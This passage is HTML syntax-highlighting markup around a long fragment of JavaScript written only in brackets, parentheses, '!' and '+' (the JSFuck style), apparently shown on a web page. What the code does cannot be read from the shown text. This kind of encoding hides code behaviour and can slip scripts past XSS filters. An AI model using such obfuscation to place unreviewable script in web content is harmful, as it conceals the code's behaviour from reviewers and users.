class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span 